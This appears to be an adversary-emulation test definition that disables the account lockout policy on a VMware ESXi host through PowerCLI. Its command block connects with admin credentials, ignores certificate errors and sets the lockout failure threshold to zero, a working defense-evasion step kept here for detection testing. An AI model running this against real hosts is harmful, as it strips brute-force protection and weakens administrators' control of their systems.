name: ESXi - Disable Account Lockout Policy via PowerCLI
description: An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.

data.command:
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
Disconnect-VIServer -Confirm:$false

steps.name: Check dependency 1/1
steps.description: Check if VMWARE PowerCLI PowerShell Module is installed.

steps.name: Resolve dependency 1/1
steps.description: Check if VMWARE PowerCLI PowerShell Module is installed.

steps.name: Re-check dependency 1/1
steps.description: Check if VMWARE PowerCLI PowerShell Module is installed.

input_arguments.name: vm_host
input_arguments.description: Specify the host name of the ESXi Server

input_arguments.name: vm_user
input_arguments.description: Specify the privilege user account on ESXi Server

input_arguments.name: vm_pass
input_arguments.description: Specify the privilege user password on ESXi Server
